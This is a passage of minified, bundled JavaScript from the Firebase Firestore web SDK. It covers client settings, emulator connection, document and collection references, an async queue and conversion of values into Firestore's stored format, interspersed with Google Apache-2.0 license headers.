 */function r4(t,e,n){if(!n)throw new ke(fe.INVALID_ARGUMENT,`Function ${t}() cannot be called with an empty ${e}.`)}function wj(t,e,n,i){if(e===!0&&i===!0)throw new ke(fe.INVALID_ARGUMENT,`${t} and ${n} cannot be used together.`)}function FA(t){if(!Pe.isDocumentKey(t))throw new ke(fe.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${t} has ${t.length}.`)}function HA(t){if(Pe.isDocumentKey(t))throw new ke(fe.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${t} has ${t.length}.`)}function N_(t){if(t===void 0)return"undefined";if(t===null)return"null";if(typeof t=="string")return t.length>20&&(t=`${t.substring(0,20)}...`),JSON.stringify(t);if(typeof t=="number"||typeof t=="boolean")return""+t;if(typeof t=="object"){if(t instanceof Array)return"an array";{const e=function(i){return i.constructor?i.constructor.name:null}(t);return e?`a custom ${e} object`:"an object"}}return typeof t=="function"?"a function":ze(12329,{type:typeof t})}function wi(t,e){if("_delegate"in t&&(t=t._delegate),!(t instanceof e)){if(e.name===t.constructor.name)throw new ke(fe.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const n=N_(t);throw new ke(fe.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${n}`)}}return t}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const s4="firestore.googleapis.com",qA=!0;class GA{constructor(e){var n,i;if(e.host===void 0){if(e.ssl!==void 0)throw new ke(fe.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=s4,this.ssl=qA}else this.host=e.host,this.ssl=(n=e.ssl)!==null&&n!==void 0?n:qA;if(this.isUsingEmulator=e.emulatorOptions!==void 0,this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=jS;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<X8)throw new ke(fe.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}wj("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=i4((i=e.experimentalLongPollingOptions)!==null&&i!==void 0?i:{}),function(o){if(o.timeoutSeconds!==void 0){if(isNaN(o.timeoutSeconds))throw new ke(fe.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (must not be NaN)`);if(o.timeoutSeconds<5)throw new ke(fe.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (minimum allowed value is 5)`);if(o.timeoutSeconds>30)throw new ke(fe.INVALID_ARGUMENT,`invalid long polling timeout: ${o.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(i,s){return i.timeoutSeconds===s.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class vp{constructor(e,n,i,s){this._authCredentials=e,this._appCheckCredentials=n,this._databaseId=i,this._app=s,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new GA({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new ke(fe.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new ke(fe.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new GA(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=function(i){if(!i)return new CP;switch(i.type){case"firstParty":return new IP(i.sessionIndex||"0",i.iamToken||null,i.authTokenFactory||null);case"provider":return i.client;default:throw new ke(fe.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(n){const i=zA.get(n);i&&(xe("ComponentProvider","Removing Datastore"),zA.delete(n),i.terminate())}(this),Promise.resolve()}}function bj(t,e,n,i={}){var s;t=wi(t,vp);const o=el(e),c=t._getSettings(),d=Object.assign(Object.assign({},c),{emulatorOptions:t._getEmulatorOptions()}),f=`${e}:${n}`;o&&(Wv(`https://${f}`),$v("Firestore",!0)),c.host!==s4&&c.host!==f&&mc("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const p=Object.assign(Object.assign({},c),{host:f,ssl:o,emulatorOptions:i});if(!Ba(p,d)&&(t._setSettings(p),i.mockUserToken)){let v,b;if(typeof i.mockUserToken=="string")v=i.mockUserToken,b=Kn.MOCK_USER;else{v=OC(i.mockUserToken,(s=t._app)===null||s===void 0?void 0:s.options.projectId);const w=i.mockUserToken.sub||i.mockUserToken.user_id;if(!w)throw new ke(fe.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");b=new Kn(w)}t._authCredentials=new SP(new WC(v,b))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Wd{constructor(e,n,i){this.converter=n,this._query=i,this.type="query",this.firestore=e}withConverter(e){return new Wd(this.firestore,e,this._query)}}class ai{constructor(e,n,i){this.converter=n,this._key=i,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new La(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new ai(this.firestore,e,this._key)}}class La extends Wd{constructor(e,n,i){super(e,n,cp(i)),this._path=i,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new ai(this.firestore,null,new Pe(e))}withConverter(e){return new La(this.firestore,e,this._path)}}function wc(t,e,...n){if(t=tn(t),r4("collection","path",e),t instanceof vp){const i=qt.fromString(e,...n);return HA(i),new La(t,null,i)}{if(!(t instanceof ai||t instanceof La))throw new ke(fe.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const i=t._path.child(qt.fromString(e,...n));return HA(i),new La(t.firestore,null,i)}}function gi(t,e,...n){if(t=tn(t),arguments.length===1&&(e=XC.newId()),r4("doc","path",e),t instanceof vp){const i=qt.fromString(e,...n);return FA(i),new ai(t,null,new Pe(i))}{if(!(t instanceof ai||t instanceof La))throw new ke(fe.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const i=t._path.child(qt.fromString(e,...n));return FA(i),new ai(t.firestore,t instanceof La?t.converter:null,new Pe(i))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const YA="AsyncQueue";class QA{constructor(e=Promise.resolve()){this.zu=[],this.ju=!1,this.Hu=[],this.Ju=null,this.Yu=!1,this.Zu=!1,this.Xu=[],this.C_=new BS(this,"async_queue_retry"),this.ec=()=>{const i=l0();i&&xe(YA,"Visibility state changed to "+i.visibilityState),this.C_.p_()},this.tc=e;const n=l0();n&&typeof n.addEventListener=="function"&&n.addEventListener("visibilitychange",this.ec)}get isShuttingDown(){return this.ju}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.nc(),this.rc(e)}enterRestrictedMode(e){if(!this.ju){this.ju=!0,this.Zu=e||!1;const n=l0();n&&typeof n.removeEventListener=="function"&&n.removeEventListener("visibilitychange",this.ec)}}enqueue(e){if(this.nc(),this.ju)return new Promise(()=>{});const n=new Ps;return this.rc(()=>this.ju&&this.Zu?Promise.resolve():(e().then(n.resolve,n.reject),n.promise)).then(()=>n.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.zu.push(e),this.sc()))}async sc(){if(this.zu.length!==0){try{await this.zu[0](),this.zu.shift(),this.C_.reset()}catch(e){if(!Vc(e))throw e;xe(YA,"Operation failed with retryable error: "+e)}this.zu.length>0&&this.C_.f_(()=>this.sc())}}rc(e){const n=this.tc.then(()=>(this.Yu=!0,e().catch(i=>{throw this.Ju=i,this.Yu=!1,Vs("INTERNAL UNHANDLED ERROR: ",KA(i)),i}).then(i=>(this.Yu=!1,i))));return this.tc=n,n}enqueueAfterDelay(e,n,i){this.nc(),this.Xu.indexOf(e)>-1&&(n=0);const s=__.createAndSchedule(this,e,n,i,o=>this.oc(o));return this.Hu.push(s),s}nc(){this.Ju&&ze(47125,{_c:KA(this.Ju)})}verifyOperationInProgress(){}async ac(){let e;do e=this.tc,await e;while(e!==this.tc)}uc(e){for(const n of this.Hu)if(n.timerId===e)return!0;return!1}cc(e){return this.ac().then(()=>{this.Hu.sort((n,i)=>n.targetTimeMs-i.targetTimeMs);for(const n of this.Hu)if(n.skipDelay(),e!=="all"&&n.timerId===e)break;return this.ac()})}lc(e){this.Xu.push(e)}oc(e){const n=this.Hu.indexOf(e);this.Hu.splice(n,1)}}function KA(t){let e=t.message||"";return t.stack&&(e=t.stack.includes(t.message)?t.stack:t.message+`
`+t.stack),e}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function WA(t){return function(n,i){if(typeof n!="object"||n===null)return!1;const s=n;for(const o of i)if(o in s&&typeof s[o]=="function")return!0;return!1}(t,["next","error","complete"])}class Bs extends vp{constructor(e,n,i,s){super(e,n,i,s),this.type="firestore",this._queue=new QA,this._persistenceKey=(s==null?void 0:s.name)||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new QA(e),this._firestoreClient=void 0,await e}}}function xj(t,e){const n=typeof t=="object"?t:Jv(),i=typeof t=="string"?t:pm,s=rp(n,"firestore").getImmediate({identifier:i});if(!s._initialized){const o=kC("firestore");o&&bj(s,...o)}return s}function _p(t){if(t._terminated)throw new ke(fe.FAILED_PRECONDITION,"The client has already been terminated.");return t._firestoreClient||Aj(t),t._firestoreClient}function Aj(t){var e,n,i;const s=t._freezeSettings(),o=function(d,f,p,v){return new GP(d,f,p,v.host,v.ssl,v.experimentalForceLongPolling,v.experimentalAutoDetectLongPolling,i4(v.experimentalLongPollingOptions),v.useFetchStreams,v.isUsingEmulator)}(t._databaseId,((e=t._app)===null||e===void 0?void 0:e.options.appId)||"",t._persistenceKey,s);t._componentsProvider||!((n=s.localCache)===null||n===void 0)&&n._offlineComponentProvider&&(!((i=s.localCache)===null||i===void 0)&&i._onlineComponentProvider)&&(t._componentsProvider={_offline:s.localCache._offlineComponentProvider,_online:s.localCache._onlineComponentProvider}),t._firestoreClient=new pj(t._authCredentials,t._appCheckCredentials,t._queue,o,t._componentsProvider&&function(d){const f=d==null?void 0:d._online.build();return{_offline:d==null?void 0:d._offline.build(f),_online:f}}(t._componentsProvider))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bc{constructor(e){this._byteString=e}static fromBase64String(e){try{return new bc(Bn.fromBase64String(e))}catch(n){throw new ke(fe.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+n)}}static fromUint8Array(e){return new bc(Bn.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wp{constructor(...e){for(let n=0;n<e.length;++n)if(e[n].length===0)throw new ke(fe.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Un(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bp{constructor(e){this._methodName=e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R_{constructor(e,n){if(!isFinite(e)||e<-90||e>90)throw new ke(fe.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(n)||n<-180||n>180)throw new ke(fe.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+n);this._lat=e,this._long=n}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return Xe(this._lat,e._lat)||Xe(this._long,e._long)}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class I_{constructor(e){this._values=(e||[]).map(n=>n)}toArray(){return this._values.map(e=>e)}isEqual(e){return function(i,s){if(i.length!==s.length)return!1;for(let o=0;o<i.length;++o)if(i[o]!==s[o])return!1;return!0}(this._values,e._values)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ej=/^__.*__$/;class Tj{constructor(e,n,i){this.data=e,this.fieldMask=n,this.fieldTransforms=i}toMutation(e,n){return this.fieldMask!==null?new Za(e,this.data,this.fieldMask,n,this.fieldTransforms):new Gd(e,this.data,n,this.fieldTransforms)}}class a4{constructor(e,n,i){this.data=e,this.fieldMask=n,this.fieldTransforms=i}toMutation(e,n){return new Za(e,this.data,this.fieldMask,n,this.fieldTransforms)}}function o4(t){switch(t){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw ze(40011,{hc:t})}}class k_{constructor(e,n,i,s,o,c){this.settings=e,this.databaseId=n,this.serializer=i,this.ignoreUndefinedProperties=s,o===void 0&&this.Pc(),this.fieldTransforms=o||[],this.fieldMask=c||[]}get path(){return this.settings.path}get hc(){return this.settings.hc}Tc(e){return new k_(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}Ic(e){var n;const i=(n=this.path)===null||n===void 0?void 0:n.child(e),s=this.Tc({path:i,Ec:!1});return s.dc(e),s}Ac(e){var n;const i=(n=this.path)===null||n===void 0?void 0:n.child(e),s=this.Tc({path:i,Ec:!1});return s.Pc(),s}Rc(e){return this.Tc({path:void 0,Ec:!0})}Vc(e){return Tm(e,this.settings.methodName,this.settings.mc||!1,this.path,this.settings.fc)}contains(e){return this.fieldMask.find(n=>e.isPrefixOf(n))!==void 0||this.fieldTransforms.find(n=>e.isPrefixOf(n.field))!==void 0}Pc(){if(this.path)for(let e=0;e<this.path.length;e++)this.dc(this.path.get(e))}dc(e){if(e.length===0)throw this.Vc("Document fields must not be empty");if(o4(this.hc)&&Ej.test(e))throw this.Vc('Document fields cannot begin and end with "__"')}}class Cj{constructor(e,n,i){this.databaseId=e,this.ignoreUndefinedProperties=n,this.serializer=i||pp(e)}gc(e,n,i,s=!1){return new k_({hc:e,methodName:n,fc:i,path:Un.emptyPath(),Ec:!1,mc:s},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function D_(t){const e=t._freezeSettings(),n=pp(t._databaseId);return new Cj(t._databaseId,!!e.ignoreUndefinedProperties,n)}function l4(t,e,n,i,s,o={}){const c=t.gc(o.merge||o.mergeFields?2:0,e,n,s);O_("Data must be an object, but it was:",c,i);const d=c4(i,c);let f,p;if(o.merge)f=new ji(c.fieldMask),p=c.fieldTransforms;else if(o.mergeFields){const v=[];for(const b of o.mergeFields){const w=Z0(e,b,n);if(!c.contains(w))throw new ke(fe.INVALID_ARGUMENT,`Field '${w}' is specified in your field mask but missing from your input data.`);d4(v,w)||v.push(w)}f=new ji(v),p=c.fieldTransforms.filter(b=>f.covers(b.field))}else f=null,p=c.fieldTransforms;return new Tj(new pi(d),f,p)}class xp extends bp{_toFieldTransform(e){if(e.hc!==2)throw e.hc===1?e.Vc(`${this._methodName}() can only appear at the top level of your update data`):e.Vc(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof xp}}class M_ extends bp{_toFieldTransform(e){return new v8(e.path,new Ad)}isEqual(e){return e instanceof M_}}function Sj(t,e,n,i){const s=t.gc(1,e,n);O_("Data must be an object, but it was:",s,i);const o=[],c=pi.empty();Xa(i,(f,p)=>{const v=P_(e,f,n);p=tn(p);const b=s.Ac(v);if(p instanceof xp)o.push(v);else{const w=Ap(p,b);w!=null&&(o.push(v),c.set(v,w))}});const d=new ji(o);return new a4(c,d,s.fieldTransforms)}function Nj(t,e,n,i,s,o){const c=t.gc(1,e,n),d=[Z0(e,i,n)],f=[s];if(o.length%2!=0)throw new ke(fe.INVALID_ARGUMENT,`Function ${e}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let w=0;w<o.length;w+=2)d.push(Z0(e,o[w])),f.push(o[w+1]);const p=[],v=pi.empty();for(let w=d.length-1;w>=0;--w)if(!d4(p,d[w])){const E=d[w];let C=f[w];C=tn(C);const M=c.Ac(E);if(C instanceof xp)p.push(E);else{const V=Ap(C,M);V!=null&&(p.push(E),v.set(E,V))}}const b=new ji(p);return new a4(v,b,c.fieldTransforms)}function Ap(t,e){if(u4(t=tn(t)))return O_("Unsupported field value:",e,t),c4(t,e);if(t instanceof bp)return function(i,s){if(!o4(s.hc))throw s.Vc(`${i._methodName}() can only be used with update() and set()`);if(!s.path)throw s.Vc(`${i._methodName}() is not currently supported inside arrays`);const o=i._toFieldTransform(s);o&&s.fieldTransforms.push(o)}(t,e),null;if(t===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),t instanceof Array){if(e.settings.Ec&&e.hc!==4)throw e.Vc("Nested arrays are not supported");return function(i,s){const o=[];let c=0;for(const d of i){let f=Ap(d,s.Rc(c));f==null&&(f={nullValue:"NULL_VALUE"}),o.push(f),c++}return{arrayValue:{values:o}}}(t,e)}return function(i,s){if((i=tn(i))===null)return{nullValue:"NULL_VALUE"};if(typeof i=="number")return p8(s.serializer,i);if(typeof i=="boolean")return{booleanValue:i};if(typeof i=="string")return{stringValue:i};if(i instanceof Date){const o=yn.fromDate(i);return{timestampValue:wm(s.serializer,o)}}if(i instanceof yn){const o=new yn(i.seconds,1e3*Math.floor(i.nanoseconds/1e3));return{timestampValue:wm(s.serializer,o)}}if(i instanceof R_)return{geoPointValue:{latitude:i.latitude,longitude:i.longitude}};if(i instanceof bc)return{bytesValue:RS(s.serializer,i._byteString)};if(i instanceof ai){const o=s.databaseId,c=i.firestore._databaseId;if(!c.isEqual(o))throw s.Vc(`Document reference is for database ${c.projectId}/${c.database} but should be for database ${o.projectId}/${o.database}`);return{referenceValue:u_(i.firestore._databaseId||s.databaseId,i._key.path)}}if(i instanceof I_)return function(c,d){return{mapValue:{fields:{[sS]:{stringValue:aS},[gm]:{arrayValue:{values:c.toArray().map(p=>{if(typeof p!="number")throw d.Vc("VectorValues must only contain numeric values.");return a_(d.serializer,p)})}}}}}}(i,s);throw s.Vc(`Unsupported field value: ${N_(i)}`)}(t,e)}function c4(t,e){const n={};return JC(t)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):Xa(t,(i,s)=>{const o=Ap(s,e.Ic(i));o!=null&&(n[i]=o)}),{mapValue:{fields:n}}}function u4(t){return!(typeof t!="object"||t===null||t instanceof Array||t instanceof Date||t instanceof yn||t instanceof R_||t instanceof bc||t instanceof ai||t instanceof bp||t instanceof I_)}function O_(t,e,n){if(!u4(n)||!function(s){return typeof s=="object"&&s!==null&&(Object.getPrototypeOf(s)===Object.prototype||Object.getPrototypeOf(s)===null)}(n)){const i=N_(n);throw i==="an object"?e.Vc(t+" a custom object"):e.Vc(t+" "+i)}}function Z0(t,e,n){if((e=tn(e))instanceof wp)return e._internalPath;if(typeof e=="string")return P_(t,e);throw Tm("Field path arguments must be of type string or ",t,!1,void 0,n)}const Rj=new RegExp("[~\\*/\\[\\]]");function P_(t,e,n){if(e.search(Rj)>=0)throw Tm(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,t,!1,void 0,n);try{return new wp(...e.split("."))._internalPath}catch{throw Tm(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,t,!1,void 0,n)}}function Tm(t,e,n,i,s){const o=i&&!i.isEmpty(),c=s!==void 0;let d=`Function ${e}() called with invalid data`;n&&(d+=" (via `toFirestore()`)"),d+=". ";let f="";return(o||c)&&(f+=" (found",o&&(f+=` in field ${i}`),c&&(f+=` in document ${s}`),f+=")"),new ke(fe.INVALID_ARGUMENT,d+t+f)}function d4(t,e){return t.some(n=>n.isEqual(e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class h4{constructor(e,n,i,s,o){this._firestore=e,this._userDataWriter=n,this._key=i,this._document=s,this._converter=o}get id(){return this._key.path.lastSegment()}get ref(){return new ai(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new Ij(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const n=this._document.data.field(f4("DocumentSnapshot.get",e));if(n!==null)return this._userDataWriter.convertValue(n)}}}class Ij extends h4{data(){return super.data()}}function f4(t,e){return typeof e=="string"?P_(t,e):e instanceof wp?e._internalPath:e._delegate._internalPath}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function m4(t){if(t.limitType==="L"&&t.explicitOrderBy.length===0)throw new ke(fe.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class kj{convertValue(e,n="none"){switch(Ga(e)){case 0:return null;case 1:return e.booleanValue;case 2:return en(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,n);case 5:return e.stringValue;case 6:return this.convertBytes(qa(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,n);case 11:return this.convertObject(e.mapValue,n);case 10:return this.convertVectorValue(e.mapValue);default:throw ze(62114,{value:e})}}convertObject(e,n){return this.convertObjectMap(e.fields,n)}convertObjectMap(e,n="none"){const i={};return Xa(e,(s,o)=>{i[s]=this.convertValue(o,n)}),i}convertVectorValue(e){var n,i,s;const o=(s=(i=(n=e.fields)===null||n===void 0?void 0:n[gm].arrayValue)===null||i===void 0?void 0:i.values)===null||s===void 0?void 0:s.map(c=>en(c.doubleValue));return new I_(o)}convertGeoPoint(e){return new R_(en(e.latitude),en(e.longitude))}convertArray(e,n){return(e.values||[]).map(i=>this.convertValue(i,n))}convertServerTimestamp(e,n){switch(n){case"previous":const i=op(e);return i==null?null:this.convertValue(i,n);case"estimate":return this.convertTimestamp(wd(e));default:return null}}convertTimestamp(e){const n=Ha(e);return new yn(n.seconds,n.nanos)}convertDocumentKey(e,n){const i=qt.fromString(e);St(PS(i),9688,{name:e});const s=new bd(i.get(1),i.get(3)),o=new Pe(i.popFirst(5));return s.isEqual(n)||Vs(`Document ${o} contains a document reference within a different database (${s.projectId}/${s.database}) which is not supported. It will be treated as a reference in the current database (${n.projectId}/${n.database}) instead.`),o}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function p4(t,e,n){let i;return i=t?t.toFirestore(e):e,i}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
